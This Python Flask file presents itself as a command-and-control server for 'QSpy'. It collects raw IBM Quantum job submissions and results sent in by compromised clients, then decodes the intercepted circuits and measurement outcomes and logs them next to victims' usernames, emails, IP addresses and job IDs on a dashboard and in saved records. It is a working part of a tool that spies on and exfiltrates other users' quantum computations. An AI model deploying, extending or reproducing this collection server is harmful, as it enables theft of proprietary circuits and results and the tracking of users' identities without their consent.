#!/usr/bin/env python3
"""
C2 Server for IBM Quantum Traffic Monitoring
Decodes raw data server-side
"""

from flask import Flask, render_template, jsonify, request
from datetime import datetime
import json
import base64
import zlib
import io
import struct
import math
import re
from collections import Counter, deque
import hashlib
from pathlib import Path
import os
from typing import Any

from qiskit import QuantumCircuit
from qiskit.circuit import ParameterExpression

app = Flask(__name__)

# Data structures
jobs = {}  # job_id -> {circuit, results, metadata}
recent_activity = deque(maxlen=50)
stats = {
    "total_jobs": 0,
    "total_circuits_captured": 0,
    "total_results_captured": 0,
    "unique_clients": set(),
    "start_time": datetime.now().isoformat(),
}


# ============================================
# DECODER CLASSES (SERVER-SIDE)
# ============================================


class QuantumResultsDecoder:
    """Server-side decoder for quantum results"""

    def __init__(self, compressed_data):
        self.compressed_data = compressed_data
        self.results = None
        self.num_qubits = None
        self._decode()

    def _decode(self):
        """Decode and decompress the quantum results"""
        try:
            decoded = base64.b64decode(self.compressed_data)
            decompressed = zlib.decompress(decoded)
            self.results = self._parse_npy(io.BytesIO(decompressed))
            max_val = max(self.results) if self.results else 0
            self.num_qubits = (
                int(math.ceil(math.log2(max_val + 1))) if max_val > 0 else 1
            )
        except Exception as e:
            raise ValueError(f"Failed to decode quantum results: {e}")

    def _parse_npy(self, file_obj):
        """Parse .npy file format"""
        magic = file_obj.read(6)
        if magic != b"\x93NUMPY":
            raise ValueError("Not a valid .npy file")

        major, _ = struct.unpack("BB", file_obj.read(2))

        if major == 1:
            header_len = struct.unpack("<H", file_obj.read(2))[0]
        else:
            header_len = struct.unpack("<I", file_obj.read(4))[0]

        header = file_obj.read(header_len).decode("latin1")
        dtype_match = re.search(r"'descr':\s*'([^']+)'", header)

        if not dtype_match:
            raise ValueError("Could not parse dtype from header")

        dtype_str = dtype_match.group(1)

        if dtype_str.startswith("<u") or dtype_str.startswith("|u"):
            byte_size = int(dtype_str[-1])
            is_unsigned = True
        elif dtype_str.startswith("<i") or dtype_str.startswith("|i"):
            byte_size = int(dtype_str[-1])
            is_unsigned = False
        else:
            raise ValueError(f"Unsupported dtype: {dtype_str}")

        data = file_obj.read()

        if byte_size == 1:
            fmt = "B" if is_unsigned else "b"
        elif byte_size == 2:
            fmt = "H" if is_unsigned else "h"
        elif byte_size == 4:
            fmt = "I" if is_unsigned else "i"
        elif byte_size == 8:
            fmt = "Q" if is_unsigned else "q"
        else:
            raise ValueError(f"Unsupported byte size: {byte_size}")

        num_elements = len(data) // byte_size
        fmt_str = "<" + fmt * num_elements
        results = list(struct.unpack(fmt_str, data))

        return results

    def to_binary_strings(self):
        """Convert measurement results to binary strings"""

        if not self.results:
            raise ValueError("Results are not available")

        return [format(val, f"0{self.num_qubits}b") for val in self.results]

    def get_counts(self):
        """Get histogram of measurement outcomes"""
        binary_strings = self.to_binary_strings()
        return dict(Counter(binary_strings))

    def get_probabilities(self):
        """Calculate measurement probabilities"""
        if not self.results:
            raise ValueError("Results are not available")

        counts = self.get_counts()
        total = len(self.results)
        return {state: count / total for state, count in counts.items()}

    def to_dict(self):
        """Export as dictionary"""
        if not self.results:
            raise ValueError("Results are not available")

        return {
            "num_qubits": self.num_qubits,
            "total_shots": len(self.results),
            "outcomes": sorted(set(self.results)),
            "state_counts": self.get_counts(),
            "probabilities": self.get_probabilities(),
        }


VALIDATION_DIR = Path(
    os.environ.get(
        "QSPY_VALIDATION_DIR",
        "validation_records",
    )
)


def canonicalize_parameter(value: Any) -> Any:
    """
    Convert a Qiskit operation parameter into a deterministic,
    JSON-serializable representation.

    This function must remain identical to the corresponding
    client-side implementation.
    """

    if isinstance(value, bool):
        return value

    if isinstance(value, int):
        return value

    if isinstance(value, float):
        if math.isnan(value):
            return "NaN"

        if math.isinf(value):
            return "Infinity" if value > 0 else "-Infinity"

        return repr(value)

    if isinstance(value, complex):
        return {
            "real": repr(value.real),
            "imag": repr(value.imag),
        }

    if isinstance(value, ParameterExpression):
        return {
            "parameter_expression": str(value),
        }

    if hasattr(value, "item"):
        try:
            scalar = value.item()

            if scalar is not value:
                return canonicalize_parameter(scalar)

        except (ValueError, TypeError):
            pass

    return {
        "type": type(value).__name__,
        "value": str(value),
    }


def canonicalize_circuit(
    circuit: QuantumCircuit,
) -> dict[str, Any]:
    """
    Convert a QuantumCircuit into a deterministic structural
    representation.

    The representation captures allocated qubits, classical bits,
    register structure, global phase, and every operation in execution
    order together with parameters and operand mappings.
    """

    instructions: list[dict[str, Any]] = []

    for instruction in circuit.data:
        operation = instruction.operation

        qubit_indices = [circuit.find_bit(qubit).index for qubit in instruction.qubits]

        clbit_indices = [circuit.find_bit(clbit).index for clbit in instruction.clbits]

        canonical_instruction = {
            "operation": operation.name,
            "label": operation.label,
            "num_qubits": operation.num_qubits,
            "num_clbits": operation.num_clbits,
            "params": [canonicalize_parameter(param) for param in operation.params],
            "qubits": qubit_indices,
            "clbits": clbit_indices,
        }

        instructions.append(canonical_instruction)

    canonical = {
        "schema_version": 1,
        "num_qubits": circuit.num_qubits,
        "num_clbits": circuit.num_clbits,
        "quantum_registers": [
            {
                "name": register.name,
                "size": register.size,
            }
            for register in circuit.qregs
        ],
        "classical_registers": [
            {
                "name": register.name,
                "size": register.size,
            }
            for register in circuit.cregs
        ],
        "global_phase": canonicalize_parameter(circuit.global_phase),
        "instructions": instructions,
    }

    return canonical


def canonical_circuit_bytes(
    circuit: QuantumCircuit,
) -> bytes:
    """
    Deterministically serialize the canonical circuit structure.
    """

    canonical = canonicalize_circuit(circuit)

    serialized = json.dumps(
        canonical,
        sort_keys=True,
        separators=(",", ":"),
        ensure_ascii=True,
    )

    return serialized.encode("utf-8")


def canonical_circuit_sha256(
    circuit: QuantumCircuit,
) -> str:
    """
    Compute SHA-256 over the canonical circuit representation.
    """

    return hashlib.sha256(canonical_circuit_bytes(circuit)).hexdigest()


def save_validation_record(
    job_id: str,
    record: dict,
) -> None:
    """
    Save one server-side validation record per IBM job.
    """

    VALIDATION_DIR.mkdir(
        parents=True,
        exist_ok=True,
    )

    output_path = VALIDATION_DIR / f"server_{job_id}.json"

    with output_path.open(
        "w",
        encoding="utf-8",
    ) as file:
        json.dump(
            record,
            file,
            indent=2,
            sort_keys=True,
        )

    print(f"Server validation record saved to {output_path}")


class QuantumCircuitDecoder:
    """
    Server-side decoder for intercepted quantum circuits.
    """

    def __init__(self, encoded_data):
        self.encoded_data = encoded_data
        self.circuit = None
        self.circuit_info = None
        self.canonical_circuit_sha256 = None

        self._decode()

    def _decode(self):
        """
        Decode the intercepted quantum circuit.
        """

        try:
            raw = base64.b64decode(self.encoded_data)

            try:
                data = zlib.decompress(raw)

            except zlib.error:
                import gzip

                data = gzip.decompress(raw)

            try:
                from qiskit.qpy import load as qpy_load

                buf = io.BytesIO(data)
                circuits = list(qpy_load(buf))

                if circuits:
                    self.circuit = circuits[0]

                    # Compute the structural fingerprint of the
                    # QuantumCircuit reconstructed by QSpy.
                    self.canonical_circuit_sha256 = canonical_circuit_sha256(
                        self.circuit
                    )

                    self.circuit_info = self._extract_circuit_info()

                else:
                    self.circuit_info = {"error": "No circuits found in QPY data"}

            except ImportError:
                self.circuit_info = self._basic_parse(io.BytesIO(data))

            except Exception as exc:
                self.circuit_info = {"error": f"QPY parsing error: {exc}"}

        except Exception as exc:
            self.circuit_info = {"error": f"Failed to decode: {exc}"}

    def _extract_circuit_info(self):
        """
        Extract structural circuit information using Qiskit.
        """

        if self.circuit is None:
            raise ValueError("Circuit object is None")

        gate_counts = {}

        active_qubits = set()
        active_clbits = set()

        for instruction in self.circuit.data:
            gate_name = instruction.operation.name
            gate_counts[gate_name] = gate_counts.get(gate_name, 0) + 1

            for qubit in instruction.qubits:
                active_qubits.add(self.circuit.find_bit(qubit).index)

            for clbit in instruction.clbits:
                active_clbits.add(self.circuit.find_bit(clbit).index)

        try:
            diagram = str(
                self.circuit.draw(
                    output="text",
                    fold=-1,
                )
            )

        except Exception:
            diagram = "Circuit diagram unavailable"

        return {
            # Active bits actually referenced by operations.
            "num_qubits": len(active_qubits),
            "num_clbits": len(active_clbits),
            # Total bits allocated in the QuantumCircuit.
            "allocated_qubits": self.circuit.num_qubits,
            "allocated_clbits": self.circuit.num_clbits,
            "circuit_depth": self.circuit.depth(),
            "num_gates": len(self.circuit.data),
            "gate_breakdown": gate_counts,
            "circuit_diagram": diagram,
            # Primary experimental validation value.
            "canonical_schema_version": 1,
            "canonical_circuit_sha256": self.canonical_circuit_sha256,
        }

    def _basic_parse(self, buf):
        """
        Basic parsing when Qiskit is unavailable.
        """

        buf.seek(0, 2)

        total_size = buf.tell()

        return {
            "encoded_size_bytes": total_size,
            "message": "Circuit captured but qiskit not available on C2 server",
        }

    def to_dict(self):
        """
        Export as dictionary.
        """

        return self.circuit_info


# ============================================
# EXTRACTION FUNCTIONS
# ============================================


def extract_circuit_data(raw_body):
    """Extract circuit from raw request body"""
    try:
        params = raw_body.get("params", {})
        pubs = params.get("pubs", [])

        for pub in pubs:
            if isinstance(pub, list) and len(pub) > 0:
                circuit_obj = pub[0]

                if (
                    isinstance(circuit_obj, dict)
                    and circuit_obj.get("__type__") == "QuantumCircuit"
                ):
                    return circuit_obj.get("__value__")

        return None
    except Exception as e:
        print(f"   ⚠️ Error extracting circuit: {e}")
        return None


def extract_results_data(raw_body):
    """Extract results from raw response body"""
    try:
        pub_results = raw_body.get("__value__", {}).get("pub_results", [])

        for pub_result in pub_results:
            data_bin = (
                pub_result.get("__value__", {})
                .get("data", {})
                .get("__value__", {})
                .get("fields", {})
            )

            for field_name, field_data in data_bin.items():
                if isinstance(field_data, dict):
                    if field_data.get("__type__") == "BitArray":
                        array_data = (
                            field_data.get("__value__", {})
                            .get("array", {})
                            .get("__value__")
                        )

                        if array_data and isinstance(array_data, str):
                            return array_data

        return None
    except Exception as e:
        print(f"   ⚠️ Error extracting results: {e}")
        return None


# ============================================
# FLASK ROUTES
# ============================================


@app.route("/")
def dashboard():
    """Main dashboard page"""
    return render_template("quantum_dashboard.html")


@app.route("/api/jobs")
def get_jobs():
    """Get all jobs organized by ID"""
    jobs_list = []
    for job_id, job_data in jobs.items():
        jobs_list.append({"job_id": job_id, **job_data})

    jobs_list.sort(key=lambda x: x.get("last_updated", ""), reverse=True)

    return jsonify(
        {
            "jobs": jobs_list,
            "stats": {**stats, "unique_clients": list(stats["unique_clients"])},
        }
    )


@app.route("/api/activity")
def get_activity():
    """Get recent activity feed"""
    return jsonify(list(recent_activity))


@app.route("/api/log", methods=["POST"])
def receive_log():
    """Receive raw data from client and decode it server-side"""
    try:
        data = request.get_json()

        if not data:
            return jsonify({"status": "error", "message": "No data received"}), 400

        log_type = data.get("type")
        timestamp = data.get("timestamp", datetime.now().isoformat())
        client_ip = data.get("client_ip", "unknown")

        stats["unique_clients"].add(client_ip)

        if log_type == "job_submission_raw":
            print(f"\n📥 Received RAW job submission from {client_ip}")
            handle_raw_job_submission(data, timestamp, client_ip)

        elif log_type == "job_results_raw":
            print(f"\n📥 Received RAW results from {client_ip}")
            handle_raw_results(data, timestamp, client_ip)

        else:
            print(f"⚠️  Unknown log type: {log_type}")
            return (
                jsonify({"status": "error", "message": f"Unknown type: {log_type}"}),
                400,
            )

        return jsonify({"status": "success"}), 200

    except Exception as e:
        print(f"❌ Error receiving log: {e}")
        import traceback

        traceback.print_exc()
        return jsonify({"status": "error", "message": str(e)}), 500


def handle_raw_job_submission(data, timestamp, client_ip):
    """Decode raw job submission data SERVER-SIDE with REAL IBM Job ID"""
    raw_body = data.get("raw_body", {})
    username = data.get("username", "unknown")
    email = data.get("email", "unknown")

    # Extract metadata
    backend = raw_body.get("backend", "unknown")
    shots = raw_body.get("shots", "unknown")

    params = raw_body.get("params", {})
    if "pubs" in params and len(params["pubs"]) > 0:
        if isinstance(params["pubs"][0], list) and len(params["pubs"][0]) > 2:
            shots = params["pubs"][0][2]

    # Get the REAL IBM Job ID from the data
    job_id = data.get("job_id")

    if not job_id or job_id == "unknown":
        print(f"   ⚠️ No valid job_id received, skipping...")
        return

    print(f"   Backend: {backend}, Shots: {shots}")
    print(f"   ✅ IBM Job ID: {job_id}")

    # Extract and DECODE circuit SERVER-SIDE
    circuit_data = extract_circuit_data(raw_body)

    if circuit_data:
        print("Decoding circuit on C2 server...")

        try:
            decoder = QuantumCircuitDecoder(circuit_data)
            circuit_info = decoder.to_dict()

            if circuit_info and "error" not in circuit_info:
                print("Circuit decoded!")

                print(
                    f"QSpy canonical circuit SHA-256: {circuit_info.get('canonical_circuit_sha256')}"
                )

            else:
                print(f"Circuit decoder returned an error: {circuit_info}")

        except Exception as exc:
            print("Circuit decoding failed: " f"{exc}")

            circuit_info = {"error": str(exc)}

    else:
        circuit_info = None

    # Create job entry with REAL IBM Job ID
    if job_id not in jobs:
        jobs[job_id] = {
            "circuit": None,
            "results": None,
            "metadata": {},
            "created_at": timestamp,
            "last_updated": timestamp,
            "client_ip": client_ip,
            "status": "submitted",
            "username": username,
            "email": email,
        }
        stats["total_jobs"] += 1

    jobs[job_id]["circuit"] = circuit_info
    jobs[job_id]["metadata"].update(
        {"backend": backend, "shots": shots, "submission_url": data.get("url")}
    )
    jobs[job_id]["last_updated"] = timestamp
    stats["total_circuits_captured"] += 1

    if circuit_info and "error" not in circuit_info:
        validation_record = {
            "job_id": job_id,
            "backend": backend,
            "shots": shots,
            "client_ip": client_ip,
            "timestamp": timestamp,
            "canonical_schema_version": circuit_info.get("canonical_schema_version"),
            "canonical_circuit_sha256": circuit_info.get("canonical_circuit_sha256"),
            "circuit_properties": {
                "active_qubits": circuit_info.get("num_qubits"),
                "active_clbits": circuit_info.get("num_clbits"),
                "allocated_qubits": circuit_info.get("allocated_qubits"),
                "allocated_clbits": circuit_info.get("allocated_clbits"),
                "depth": circuit_info.get("circuit_depth"),
                "num_gates": circuit_info.get("num_gates"),
                "gate_breakdown": circuit_info.get("gate_breakdown"),
            },
            "results_captured": False,
        }

        save_validation_record(
            job_id=job_id,
            record=validation_record,
        )

    # Add to activity feed
    recent_activity.append(
        {
            "type": "circuit_captured",
            "timestamp": timestamp,
            "job_id": job_id,
            "client_ip": client_ip,
            "backend": backend,
            "num_qubits": circuit_info.get("num_qubits") if circuit_info else "unknown",
        }
    )


def handle_raw_results(data, timestamp, client_ip):
    """Decode raw results data SERVER-SIDE"""
    raw_body = data.get("raw_body", {})
    job_id = data.get("job_id")
    username = data.get("username")
    email = data.get("email")

    if not job_id:
        print(f"   ⚠️  No job_id, creating orphan entry")
        job_id = f"orphan_{timestamp.replace(':', '_').replace('.', '_')}"

    # Extract and DECODE results SERVER-SIDE
    results_data = extract_results_data(raw_body)

    if results_data:
        print(f"   🔍 Decoding results on C2 server...")
        try:
            decoder = QuantumResultsDecoder(results_data)
            results_info = decoder.to_dict()
            print(f"   ✅ Results decoded!")
            print(f"   📊 Total shots: {results_info['total_shots']}")
        except Exception as e:
            print(f"   ⚠️ Results decoding failed: {e}")
            results_info = {"error": str(e)}
    else:
        results_info = None

    # Create or update job entry
    if job_id not in jobs:
        jobs[job_id] = {
            "circuit": None,
            "results": None,
            "metadata": {},
            "created_at": timestamp,
            "last_updated": timestamp,
            "client_ip": client_ip,
            "status": "results_only",
            "username": username,
            "email": email,
        }
        stats["total_jobs"] += 1

    jobs[job_id]["results"] = results_info
    jobs[job_id]["metadata"].update(
        {"results_url": data.get("url"), "status_code": data.get("status_code")}
    )
    jobs[job_id]["last_updated"] = timestamp
    jobs[job_id]["status"] = "completed"
    stats["total_results_captured"] += 1

    validation_path = VALIDATION_DIR / f"server_{job_id}.json"

    if validation_path.exists():
        with validation_path.open(
            "r",
            encoding="utf-8",
        ) as file:
            validation_record = json.load(file)

    else:
        validation_record = {
            "job_id": job_id,
        }

    validation_record.update(
        {
            "results_captured": results_info is not None,
            "result_timestamp": timestamp,
            "result_status_code": data.get("status_code"),
            "results": results_info,
        }
    )

    save_validation_record(
        job_id=job_id,
        record=validation_record,
    )

    # Add to activity feed
    recent_activity.append(
        {
            "type": "results_captured",
            "timestamp": timestamp,
            "job_id": job_id,
            "client_ip": client_ip,
            "total_shots": (
                results_info.get("total_shots") if results_info else "unknown"
            ),
            "num_states": (
                len(results_info.get("state_counts", {})) if results_info else 0
            ),
            "username": username,
            "email": email,
        }
    )


@app.route("/api/clear", methods=["POST"])
def clear_data():
    """Clear all data"""
    jobs.clear()
    recent_activity.clear()
    stats["total_jobs"] = 0
    stats["total_circuits_captured"] = 0
    stats["total_results_captured"] = 0
    stats["unique_clients"] = set()
    print("🗑️  All data cleared")
    return jsonify({"status": "success"})


@app.route("/health")
def health():
    """Health check endpoint"""
    return (
        jsonify(
            {
                "status": "healthy",
                "uptime": datetime.now().isoformat(),
                "jobs_tracked": len(jobs),
            }
        ),
        200,
    )


if __name__ == "__main__":
    print("\n" + "=" * 80)
    print("🖥️  IBM Quantum C2 Server Starting...")
    print("=" * 80)

    try:
        import qiskit

        print("✅ Qiskit available - Full circuit decoding enabled")
    except ImportError:
        print("⚠️  Qiskit not found - Install with: pip3 install qiskit")
        print("   Circuit diagrams will not be available")

    print("📊 Dashboard: http://0.0.0.0:8000")
    print("📡 API Endpoint: http://0.0.0.0:8000/api/log")
    print("🎯 Server-side decoding: Clients send RAW data")
    print("=" * 80 + "\n")

    try:
        from waitress import serve

        print("🚀 Using Waitress production server")
        serve(app, host="0.0.0.0", port=8000, threads=4)
    except ImportError:
        print("⚠️  Waitress not available, using Flask dev server")
        app.run(host="0.0.0.0", port=8000, debug=True)
